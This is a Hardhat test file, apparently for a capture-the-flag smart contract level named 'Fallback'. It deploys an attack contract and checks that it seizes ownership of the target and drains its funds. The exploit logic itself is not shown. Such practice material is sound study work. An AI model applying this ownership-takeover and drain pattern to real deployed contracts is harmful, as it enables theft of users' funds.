import { ethers } from "hardhat";
import { Fallback as FallbackTargetContract, FallbackExploit as FallbackExploitContract } from "../gen/types"
import { expect } from "chai";

describe("Fallback Exploit", async () => {
    let targetContract: FallbackTargetContract;
    let attackContract: FallbackExploitContract;

    beforeEach("Setup Target Contract", async () => {
        let targetContractFactory = await ethers.getContractFactory("Fallback");
        let attackContractFactory = await ethers.getContractFactory("FallbackExploit");

        targetContract = await targetContractFactory.deploy();
        attackContract = await attackContractFactory.deploy(targetContract.address, {value: ethers.utils.parseEther("1.0")});
    })

    it("should drain funds", async () => {
       // Attack
       await attackContract.setup();
       await attackContract.attack();
       console.log("Attacker addres is", attackContract.address);
       await attackContract.cashOut();

       const owner = await targetContract.owner();
       const ownerContributions = await targetContract.contributions(owner);

       expect(owner).to.eql(attackContract.address.toLowerCase());
       expect(ownerContributions.eq(0)).to.be.true;
    })
})